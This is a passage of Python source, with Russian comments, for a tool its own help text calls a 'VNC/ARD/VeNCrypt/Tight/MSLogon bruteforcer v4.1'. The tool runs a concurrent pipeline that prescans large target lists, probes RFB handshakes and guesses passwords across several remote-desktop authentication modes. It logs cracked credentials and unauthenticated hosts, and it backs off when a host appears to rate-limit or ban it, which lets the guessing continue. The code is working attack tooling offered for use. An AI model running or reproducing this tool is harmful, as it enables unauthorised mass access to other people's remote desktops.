            self.delays.setdefault(key, self.base)
        return lock
    def get(self, key: str) -> float: return self.delays.get(key, self.base)
    def bump(self, key: str):
        cur = self.delays.get(key, self.base)
        self.delays[key] = min(max(cur * 2, 0.5), 8.0)
    def relax(self, key: str):
        cur = self.delays.get(key, self.base)
        if cur > self.base:
            self.delays[key] = max(cur * 0.7, self.base)


def check_ulimit(needed: int, console: Console):
    if not HAS_RESOURCE: return
    try: soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    except Exception: return
    if soft < needed:
        try:
            new_soft = min(hard, max(needed, soft))
            resource.setrlimit(resource.RLIMIT_NOFILE, (new_soft, hard))
            soft = new_soft
        except Exception: pass
    if soft < needed:
        console.print(f"[yellow]warn:[/] RLIMIT_NOFILE={soft} < нужно {needed}. "
                      f"`ulimit -n {needed}`")


# ─── ENGINE (pipeline: prescan → probe → brute) ─────────────────────

class Engine:
    def __init__(self, args, console: Console):
        self.args = args
        self.console = console
        self.stats = Stats()
        self.stop = asyncio.Event()
        self.hard_stop = asyncio.Event()
        self.passwords = prioritize_wordlist(load_wordlist(args.wordlist), args.shuffle)
        self.ard_users = (load_wordlist(args.ard_users)
                          if args.ard_users else list(BUILTIN_ARD_USERS))
        if args.ard_max_users > 0:
            self.ard_users = self.ard_users[:args.ard_max_users]
        self.mslogon_creds = load_mslogon_creds(args.mslogon_creds) \
            if getattr(args, "mslogon_creds", None) else []
        self.allow_mslogon = bool(getattr(args, "allow_mslogon", False))
        self.hits = HitWriter(args.out)
        self.snap = StateSnap(f"{args.out}.state.json")
        self.gate = HostGate(args.per_host_delay)
        self.global_rl = TokenBucket(args.rate_global) if args.rate_global > 0 else None
        self.per_host_rl: dict[str, TokenBucket] = {}
        self.skip: set[str] = set(self.hits.load_done()) if args.resume else set()

        # debug file + асинхронный lock (fix v4.1: раньше могли рваться строки)
        self.debug_f = open(args.debug, "a", encoding="utf-8") if args.debug else None
        self.debug_lock = asyncio.Lock()

        # хосты с подтверждённым probe-handshake — для ban-эвристики (fix v4.1 #5)
        self.alive_hosts: set[str] = set()

        # средний размер плана на хост (для честной ETA, fix v4.1 #1)
        self._plan_sizes: deque = deque(maxlen=64)

        # pipeline queues
        self.q_targets: asyncio.Queue[Optional[Target]] = asyncio.Queue(
            maxsize=args.prescan_concurrency * 4)
        self.q_probes: asyncio.Queue[Optional[Target]] = asyncio.Queue(
            maxsize=args.probe_concurrency * 4)
        self.q_brutes: asyncio.Queue[Optional[ProbeResult]] = asyncio.Queue(
            maxsize=args.brute_concurrency * 4)

        # реальное число воркеров фиксируем при старте (fix v4.1 #2)
        self.n_pre = min(args.prescan_concurrency, 1024)
        self.n_probe = min(args.probe_concurrency, 512)
        self.n_brute = min(args.brute_concurrency, 512)

    async def log(self, msg: str):
        if self.debug_f:
            async with self.debug_lock:
                self.debug_f.write(f"{time.strftime('%H:%M:%S')} {msg}\n")
                self.debug_f.flush()

    def _host_rl(self, host: str) -> Optional[TokenBucket]:
        """fix v4.1 #3: setdefault вместо двухшаговой проверки"""
        if self.args.rate_per_host <= 0: return None
        rl = self.per_host_rl.get(host)
        if rl is None:
            new_rl = TokenBucket(self.args.rate_per_host,
                                 burst=max(self.args.rate_per_host, 2))
            rl = self.per_host_rl.setdefault(host, new_rl)
        return rl

    # ── PRESCAN ────────────────────────────────────────────────────
    async def prescan_worker(self, in_q: asyncio.Queue[Optional[Target]],
                            out_q: asyncio.Queue[Optional[Target]],
                            sem: asyncio.Semaphore):
        while not self.hard_stop.is_set():
            t = await in_q.get()
            if t is None:
                in_q.task_done()
                break
            try:
                if t.key in self.skip:
                    self.stats.prescanned += 1
                    continue
                async with sem:
                    alive = await tcp_alive(t, self.args.prescan_timeout)
                self.stats.prescanned += 1
                if alive:
                    self.stats.prescan_open += 1
                    await out_q.put(t)
                else:
                    self.stats.prescan_dead += 1
            finally:
                in_q.task_done()

    # ── PROBE ──────────────────────────────────────────────────────
    async def probe_worker(self, in_q: asyncio.Queue[Optional[Target]],
                          out_q: asyncio.Queue[Optional[ProbeResult]],
                          sem: asyncio.Semaphore):
        while not self.hard_stop.is_set():
            t = await in_q.get()
            if t is None:
                in_q.task_done()
                break
            try:
                async with sem:
                    pr = await probe(t, self.args.probe_timeout)
                self.stats.probed += 1
                if not pr.alive:
                    self.stats.error_kinds[f"probe:{pr.note}"] += 1
                    continue
                self.stats.alive += 1
                # хост подтверждённо отвечает RFB → пометим для ban-эвристики
                self.alive_hosts.add(t.key)

                if pr.no_auth:
                    self.stats.no_auth += 1
                    await self.hits.write(t.host, t.port, "no_auth", "", pr.version,
                                          ",".join(SEC_TYPES.get(x,str(x)) for x in pr.sec_types))
                    continue
                if pr.note.startswith("unsupported:"):
                    self.stats.unsupported += 1
                    await self.hits.write(t.host, t.port, "unsupported", "", pr.version, pr.note)
                    continue
                if pr.note.startswith("unbrutable:"):
                    self.stats.unbrutable += 1
                    await self.hits.write(t.host, t.port, "unbrutable", "", pr.version, pr.note)
                    continue
                await out_q.put(pr)
            finally:
                in_q.task_done()

    # ── план брутфорса для конкретного хоста ───────────────────────
    def _plan(self, pr: ProbeResult):
        """возвращает (mode_label, iterable_of_(user, pw, extra), plan_size)
        plan_size — для честной ETA"""
        npw = len(self.passwords)
        nusr = len(self.ard_users) or 1
        if pr.supports_vnc:
            return ("vnc",
                    ((None, pw, None) for pw in self.passwords),
                    npw)
        if pr.supports_tls:
            return ("tls",
                    ((None, pw, None) for pw in self.passwords),
                    npw)
        if pr.venc_subs:
            sub = pick_venc(pr.venc_subs, want_user=True)
            if sub is not None:
                it = ((u, pw, sub) for pw in self.passwords for u in self.ard_users)
                return ("venc_plain", it, npw * nusr)
            sub = pick_venc(pr.venc_subs, want_user=False)
            if sub is not None:
                return ("venc_vnc",
                        ((None, pw, sub) for pw in self.passwords),
                        npw)
        if pr.supports_ard:
            it = ((u, pw, None) for pw in self.passwords for u in self.ard_users)
            return ("ard", it, npw * nusr)
        if pr.supports_tight:
            return ("tight",
                    ((None, pw, None) for pw in self.passwords),
                    npw)
        if self.allow_mslogon and self.mslogon_creds:
            ncreds = len(self.mslogon_creds)
            if pr.supports_mslogon2:
                return ("mslogon2",
                        ((u, p, None) for (u, p) in self.mslogon_creds),
                        ncreds)
            if pr.supports_mslogon1:
                return ("mslogon1",
                        ((u, p, None) for (u, p) in self.mslogon_creds),
                        ncreds)
        return None

    async def _do_attempt(self, mode, t, user, pw, extra) -> tuple[str, str]:
        to = self.args.brute_timeout
        if   mode == "vnc":         return await attempt_vnc(t, pw, to)
        elif mode == "tls":         return await attempt_tls(t, pw, to + 2.0)
        elif mode == "ard":         return await attempt_ard(t, user, pw, to)
        elif mode == "venc_plain":  return await attempt_venc(t, extra, user, pw, to + 2.0)
        elif mode == "venc_vnc":    return await attempt_venc(t, extra, "", pw, to + 2.0)
        elif mode == "tight":       return await attempt_tight(t, pw, to)
        elif mode == "mslogon1":    return await attempt_mslogon1(t, user, pw, to)
        elif mode == "mslogon2":    return await attempt_mslogon2(t, user, pw, to)
        return "error", f"unknown-mode:{mode}"

    # ── BRUTE ──────────────────────────────────────────────────────
    async def brute_worker(self, in_q: asyncio.Queue[Optional[ProbeResult]],
                          sem: asyncio.Semaphore):
        while not self.hard_stop.is_set():
            pr = await in_q.get()
            if pr is None:
                in_q.task_done()
                break
            try:
                await self._brute_one(pr, sem)
            finally:
                in_q.task_done()
                self.stats.bruted += 1

    async def _brute_one(self, pr: ProbeResult, sem: asyncio.Semaphore):
        t = pr.target
        if t.key in self.skip: return
        plan = self._plan(pr)
        if plan is None: return
        mode, it, plan_size = plan
        self._plan_sizes.append(plan_size)

        host_key = t.key
        host_lock = self.gate.lock_for(host_key)
        host_rl = self._host_rl(t.host)

        # счётчики для классификации поведения хоста (fix v4.1 #5)
        bad = 0          # подряд error/dead (некритичные)
        closed_streak = 0  # подряд dead:closed на живом хосте → ban
        tried = 0

        async with host_lock:
            self.stats.inflight.add(host_key)
            try:
                for user, pw, extra in it:
                    if self.stop.is_set() or self.hard_stop.is_set(): break
                    if (self.args.max_pw_per_host > 0
                            and tried >= self.args.max_pw_per_host):
                        break

                    if self.global_rl: await self.global_rl.take()
                    if host_rl:        await host_rl.take()

                    d = self.gate.get(host_key)
                    if d > 0: await asyncio.sleep(d)

                    async with sem:
                        status, info = await self._do_attempt(mode, t, user, pw, extra)

                    self.stats.attempts += 1; tried += 1
                    show_user = user if user else ""
                    self.stats.last_tries.append(
                        f"{t}  [{mode}]  u={show_user!r:>14}  pw={pw!r:<18}  → {status}"
                    )

                    if status == "cracked":
                        self.stats.cracked += 1
                        self.stats.hit_kinds[mode] += 1
                        stat_name = {
                            "vnc":"cracked","tls":"cracked_tls","ard":"cracked_ard",
                            "venc_plain":"cracked_venc","venc_vnc":"cracked_venc",
                            "tight":"cracked_tight",
                            "mslogon1":"cracked_mslogon1","mslogon2":"cracked_mslogon2",
                        }[mode]
                        note = f"user={user}" if user else ""
                        await self.hits.write(t.host, t.port, stat_name, pw, info, note)
                        self.stats.last_hits.append(
                            f"[bold green]{stat_name.upper()}[/] {t}  "
                            f"pw=[bold white]{pw!r}[/]  ({info})"
                        )
                        return

                    if status == "fail":
                        bad = 0; closed_streak = 0
                        self.gate.relax(host_key)
                        continue

                    if status == "banlike":
                        self.stats.error_kinds[f"ban:{info[:40]}"] += 1
                        self.gate.bump(host_key)
                        await asyncio.sleep(self.gate.get(host_key) * 2)
                        bad += 1
                        if bad >= 3:
                            await self.hits.event("warn","give up (ban)", target=t.key)
                            return
                        continue

                    if status == "dead":
                        self.stats.errors += 1
                        self.stats.error_kinds[f"net:{info}"] += 1

                        # fix v4.1 #5: ban-эвристика для UltraVNC и co.
                        # если хост подтверждён probe'ом и нам подряд закрывают
                        # соединение — это rate-limit, а не смерть
                        if (info == "closed"
                                and host_key in self.alive_hosts):
                            closed_streak += 1
                            self.stats.error_kinds["ban:silent-close"] += 1
                            self.gate.bump(host_key)
                            backoff = self.gate.get(host_key) * 3
                            await asyncio.sleep(min(backoff, 15.0))
                            if closed_streak >= 5:
                                await self.hits.event(
                                    "warn", "give up (silent-ban)", target=t.key)
                                return
                            # bad НЕ инкрементим — это не смерть
                            continue

                        bad += 1; self.gate.bump(host_key)
                        if bad >= 4:
                            await self.hits.event("warn","give up (dead)", target=t.key)
                            return
                        continue

                    # error
                    self.stats.errors += 1
                    self.stats.error_kinds[f"err:{info}"] += 1
                    bad += 1
                    if bad >= 5:
                        await self.hits.event("warn","give up (err)",
                                              target=t.key, last=info)
                        return
            finally:
                self.stats.inflight.discard(host_key)

    # ── pipeline runner ────────────────────────────────────────────
    async def run_pipeline(self, targets: list[Target]):
        self.stats.total = len(targets)

        prescan_sem = asyncio.Semaphore(self.args.prescan_concurrency)
        probe_sem   = asyncio.Semaphore(self.args.probe_concurrency)
        brute_sem   = asyncio.Semaphore(self.args.brute_concurrency)

        # воркеры с зафиксированным числом (fix v4.1 #2)
        pre_workers = [asyncio.create_task(
            self.prescan_worker(self.q_targets, self.q_probes, prescan_sem)
        ) for _ in range(self.n_pre)]

        probe_workers = [asyncio.create_task(
            self.probe_worker(self.q_probes, self.q_brutes, probe_sem)
        ) for _ in range(self.n_probe)]

        brute_workers = [asyncio.create_task(
            self.brute_worker(self.q_brutes, brute_sem)
        ) for _ in range(self.n_brute)]

        async def feeder():
            self.stats.phase = "prescan"
            for t in targets:
                if self.hard_stop.is_set(): break
                await self.q_targets.put(t)
            # ровно столько None, сколько воркеров (fix v4.1 #2)
            for _ in range(self.n_pre):
                await self.q_targets.put(None)

        feeder_task = asyncio.create_task(feeder())

        async def drain():
            await feeder_task
            await self.q_targets.join()
            for _ in range(self.n_probe):
                await self.q_probes.put(None)
            self.stats.phase = "probe"
            await self.q_probes.join()
            for _ in range(self.n_brute):
                await self.q_brutes.put(None)
            self.stats.phase = "brute"
            await self.q_brutes.join()
            self.stats.phase = "done"

        drain_task = asyncio.create_task(drain())

        try:
            await drain_task
        except asyncio.CancelledError:
            pass
        finally:
            for w in pre_workers + probe_workers + brute_workers:
                if not w.done(): w.cancel()
            await asyncio.gather(*pre_workers, *probe_workers, *brute_workers,
                                 return_exceptions=True)

    # ── snapshot ───────────────────────────────────────────────────
    async def snapshot_loop(self):
        while not self.hard_stop.is_set():
            await self._write_snapshot()
            try: await asyncio.wait_for(self.hard_stop.wait(), timeout=5.0)
            except asyncio.TimeoutError: pass
        # финальный snapshot (fix v4.1: раньше пропадал)
        await self._write_snapshot()

    async def _write_snapshot(self):
        try:
            await self.snap.write({
                "ts": time.time(), "phase": self.stats.phase,
                "stats": {
                    "total": self.stats.total,
                    "prescanned": self.stats.prescanned,
                    "prescan_open": self.stats.prescan_open,
                    "probed": self.stats.probed,
                    "alive": self.stats.alive,
                    "bruted": self.stats.bruted,
                    "cracked": self.stats.cracked,
                    "attempts": self.stats.attempts,
                    "aps": round(self.stats.aps, 2),
                    "hit_kinds": dict(self.stats.hit_kinds),
                    "top_errors": dict(self.stats.error_kinds.most_common(10)),
                },
            })
        except Exception: pass

    # средний размер плана на хост — для честной ETA (fix v4.1 #1)
    def avg_plan_size(self) -> float:
        if self._plan_sizes:
            return sum(self._plan_sizes) / len(self._plan_sizes)
        # fallback пока ни одного хоста не добили — оценка снизу
        return float(len(self.passwords))


# ─── UI ─────────────────────────────────────────────────────────────

SPARK = " ▁▂▃▄▅▆▇█"

def sparkline(hist) -> str:
    if not hist: return ""
    mx = max(hist) or 1
    return "".join(SPARK[max(0, min(int((v/mx)*(len(SPARK)-1)), len(SPARK)-1))]
                   for v in hist)


def _phase_bar(stats: Stats, total: int) -> Text:
    if stats.phase == "prescan":
        cur, tot, label = stats.prescanned, total, "prescan"
    elif stats.phase == "probe":
        cur, tot, label = stats.probed, max(stats.prescan_open, 1), "probe"
    elif stats.phase == "brute":
        cur, tot, label = stats.bruted, max(stats.alive, 1), "brute"
    elif stats.phase == "done":
        return Text.from_markup("[bold green]● DONE[/]")
    else:
        return Text.from_markup("[dim]init...[/]")
    width = 40
    frac = min(cur / max(tot, 1), 1.0)
    filled = int(frac * width)
    bar = "█" * filled + "░" * (width - filled)
    pct = int(frac * 100)
    return Text.from_markup(
        f"[bold cyan]{label:<8}[/] [green]{bar}[/] [bold]{pct:>3}%[/]  "
        f"[dim]{cur}/{tot}[/]"
    )


def render(stats: Stats, eng: "Engine") -> Group:
    """fix v4.1 #1: ETA теперь честная — через средний план/хост из движка,
    без дёрганья load_wordlist на каждый кадр"""
    head = Text(BANNER.strip("\n"), style="bold cyan")

    elapsed = int(time.time() - stats.started)
    h, rem = divmod(elapsed, 3600); m, s = divmod(rem, 60)
    eta = "--:--:--"
    if stats.phase == "brute" and stats.aps > 0 and stats.alive > 0:
        avg_plan = eng.avg_plan_size()
        # ожидаем что в среднем ~30% плана уходит до cracked/exhaust;
        # это очень грубо, но честнее чем считать весь wordlist
        remaining_hosts = max(stats.alive - stats.bruted, 0)
        remaining_attempts = remaining_hosts * avg_plan * 0.5
        secs = int(remaining_attempts / max(stats.aps, 0.1))
        eh, er = divmod(secs, 3600); em, es = divmod(er, 60)
        eta = f"{eh:02d}:{em:02d}:{es:02d}"

    top = Table.grid(expand=True)
    top.add_column(ratio=1); top.add_column(ratio=1)
    top.add_column(ratio=1); top.add_column(ratio=1)
    top.add_row(
        f"[dim]total[/]       {stats.total}\n"
        f"[dim]prescanned[/]  {stats.prescanned}\n"
        f"[dim]open(tcp)[/]   [cyan]{stats.prescan_open}[/]",
        f"[dim]probed[/]      {stats.probed}\n"
        f"[dim]alive(rfb)[/]  [cyan]{stats.alive}[/]\n"
        f"[dim]bruted[/]      {stats.bruted}",
        f"[dim]cracked[/]     [bold green]{stats.cracked}[/]\n"
        f"[dim]no-auth[/]     {stats.no_auth}\n"
        f"[dim]unsupported[/] {stats.unsupported} / [dim]unbrut[/] {stats.unbrutable}",
        f"[dim]attempts[/]    {stats.attempts}\n"
        f"[dim]errors[/]      {stats.errors}\n"
        f"[dim]aps[/]         {stats.aps:.1f}",
    )

    bar = _phase_bar(stats, stats.total)

    left = Panel(
        f"phase:    [bold]{stats.phase}[/]\n"
        f"elapsed:  {h:02d}:{m:02d}:{s:02d}\n"
        f"eta(b):   {eta}\n"
        f"inflight: {len(stats.inflight)}\n"
        f"aps:      [cyan]{sparkline(stats.aps_hist)}[/]\n"
        f"eps:      [red]{sparkline(stats.eps_hist)}[/]",
        title="[bold]runtime[/]", border_style="cyan",
    )

    hk = stats.hit_kinds
    if hk:
        total_hits = sum(hk.values()) or 1
        rows = []
        for k in ("vnc","tls","ard","venc_plain","venc_vnc",
                  "tight","mslogon1","mslogon2"):
            c = hk.get(k, 0)
            pct = int((c / total_hits) * 20) if c else 0
            bar20 = "█" * pct + "░" * (20 - pct)
            color = "green" if c else "dim"
            rows.append(f"[{color}]{k:<11}[/] [{color}]{bar20}[/] {c}")
        hits_body = "\n".join(rows)
    else:
        hits_body = "[dim]пока пусто[/]"
    mid = Panel(hits_body, title="[bold]hit-kinds[/]", border_style="green")

    if stats.error_kinds:
        rows = []
        for k, c in stats.error_kinds.most_common(8):
            short = k if len(k) <= 36 else k[:33] + "…"
            rows.append(f"[red]{c:>5}[/]  {short}")
        errs = "\n".join(rows)
    else:
        errs = "[dim]чисто[/]"
    right = Panel(errs, title="[bold]errors[/]", border_style="red")

    cols = Columns([left, mid, right], equal=True, expand=True)

    last_cracks = Panel(
        "\n".join(stats.last_hits) if stats.last_hits else "[dim]ожидание...[/]",
        title="[bold]last cracks[/]", border_style="yellow",
    )

    tail_lines = list(stats.last_tries)[-10:]
    tail = Panel(
        "\n".join(tail_lines) if tail_lines else "[dim]—[/]",
        title="[bold]live tail[/]", border_style="magenta",
    )

    return Group(
        Align.center(head),
        Align.center(bar),
        top,
        cols,
        last_cracks,
        tail,
    )


# ─── MAIN ───────────────────────────────────────────────────────────

def parse_args():
    p = argparse.ArgumentParser(prog="vncbrute",
        description="VNC/ARD/VeNCrypt/Tight/MSLogon bruteforcer v4.1")
    p.add_argument("-i","--input", required=True)
    p.add_argument("-w","--wordlist")
    p.add_argument("-o","--out", default="hits")

    p.add_argument("--prescan-concurrency", type=int, default=2000,
                   help="TCP pre-scan параллелизм (отсев мёртвых)")
    p.add_argument("--prescan-timeout", type=float, default=1.5)
    p.add_argument("--probe-concurrency", type=int, default=500,
                   help="RFB-handshake параллелизм")
    p.add_argument("--probe-timeout", type=float, default=5.0)
    p.add_argument("--brute-concurrency", type=int, default=300,
                   help="параллельных хостов на брутфорсе")
    p.add_argument("--brute-timeout", type=float, default=7.0)

    p.add_argument("--rate-global", type=float, default=0.0,
                   help="глобальный лимит attempts/sec (0=без лимита)")
    p.add_argument("--rate-per-host", type=float, default=0.0,
                   help="лимит attempts/sec на хост (0=без лимита)")
    p.add_argument("--per-host-delay", type=float, default=0.0,
                   help="базовая задержка между попытками к одному host:port")
    p.add_argument("--max-pw-per-host", type=int, default=0,
                   help="макс паролей на хост (0=весь wordlist)")

    p.add_argument("--shuffle", action="store_true")
    p.add_argument("--resume", action="store_true")

    p.add_argument("--ard-users", default=None)
    p.add_argument("--ard-max-users", type=int, default=5)
    p.add_argument("--mslogon-creds", default=None)
    p.add_argument("--allow-mslogon", action="store_true")

    p.add_argument("--no-uvloop", action="store_true")
    p.add_argument("--debug", default=None)
    return p.parse_args()


async def run(args):
    console = Console()
    console.print(Text(BANNER, style="bold cyan"))
    fd_needed = max(args.prescan_concurrency, args.probe_concurrency,
                    args.brute_concurrency) * 4 + 512
    check_ulimit(fd_needed, console)

    eng = Engine(args, console)

    console.print("[cyan]loading targets...[/]")
    targets = list(iter_targets(Path(args.input)))
    eng.stats.total = len(targets)
    console.print(
        f"[cyan]targets:[/] {len(targets)}   "
        f"[cyan]passwords:[/] {len(eng.passwords)}   "
        f"[cyan]ard-users:[/] {len(eng.ard_users)}"
    )
    if eng.mslogon_creds:
        console.print(f"[cyan]mslogon creds:[/] {len(eng.mslogon_creds)}")
    if eng.allow_mslogon:
        console.print("[yellow]MSLogon ENABLED — риск блокировки аккаунтов[/]")
    if eng.skip:
        console.print(f"[yellow]resume:[/] пропуск {len(eng.skip)} уже сделанных")

    if args.shuffle:
        random.shuffle(targets)

    loop = asyncio.get_running_loop()
    ctrlc = {"n": 0}
    def _sig():
        ctrlc["n"] += 1
        if ctrlc["n"] == 1:
            console.print("\n[yellow]graceful stop... ещё раз Ctrl+C — hard exit[/]")
            eng.stop.set()
        else:
            console.print("\n[red]hard exit[/]")
            eng.hard_stop.set(); eng.stop.set()
    try:
        loop.add_signal_handler(signal.SIGINT, _sig)
        loop.add_signal_handler(signal.SIGTERM, _sig)
    except NotImplementedError:
        signal.signal(signal.SIGINT, lambda *_: _sig())

    snap_task = asyncio.create_task(eng.snapshot_loop())

    async def ui_loop():
        with Live(render(eng.stats, eng), refresh_per_second=5,
                  console=console, screen=False) as live:
            while not eng.hard_stop.is_set():
                eng.stats.tick()
                live.update(render(eng.stats, eng))
                try: await asyncio.wait_for(eng.hard_stop.wait(), timeout=0.2)
                except asyncio.TimeoutError: pass
                if eng.stats.phase == "done":
                    eng.stats.tick()
                    live.update(render(eng.stats, eng))
                    break
    ui_task = asyncio.create_task(ui_loop())

    try:
        await eng.run_pipeline(targets)
    finally:
        eng.hard_stop.set()
        for task in (snap_task, ui_task):
            try: await asyncio.wait_for(task, timeout=2.0)
            except Exception: pass
        eng.hits.close()
        if eng.debug_f:
            try: eng.debug_f.close()
            except Exception: pass

    s = eng.stats
    console.print()
    console.rule("[bold cyan]итог[/]")
    console.print(
        f"[bold]targets:[/] {s.total}   "
        f"[bold]prescanned:[/] {s.prescanned}   "
        f"[bold]open:[/] {s.prescan_open}\n"
        f"[bold]probed:[/] {s.probed}   "
        f"[bold]alive:[/] {s.alive}   "
        f"[bold]bruted:[/] {s.bruted}\n"
        f"[bold green]cracked:[/] {s.cracked}   "
        f"[bold]no-auth:[/] {s.no_auth}   "
        f"[bold]unsupported:[/] {s.unsupported}   "
        f"[bold]unbrutable:[/] {s.unbrutable}\n"
        f"[bold]attempts:[/] {s.attempts}   "
        f"[bold]errors:[/] {s.errors}   "
        f"[bold]avg aps:[/] {s.aps:.1f}"
    )
    if s.hit_kinds:
        console.print("[bold]hit-kinds:[/]")
        for k, v in s.hit_kinds.most_common():
            console.print(f"  {k:<12} {v}")
    if s.error_kinds:
        console.print("[bold]top errors:[/]")
        for k, v in s.error_kinds.most_common(10):
            console.print(f"  [red]{v:>5}[/]  {k}")
    console.print(
        f"\n[dim]файлы:[/] {args.out}.jsonl  {args.out}.csv  "
        f"{args.out}.log.jsonl  {args.out}.state.json"
    )


def main():
    args = parse_args()
    if HAS_UVLOOP and not args.no_uvloop:
        uvloop.install()
    try:
        asyncio.run(run(args))
    except KeyboardInterrupt:
        sys.exit(130)


if __name__ == "__main__":
    main()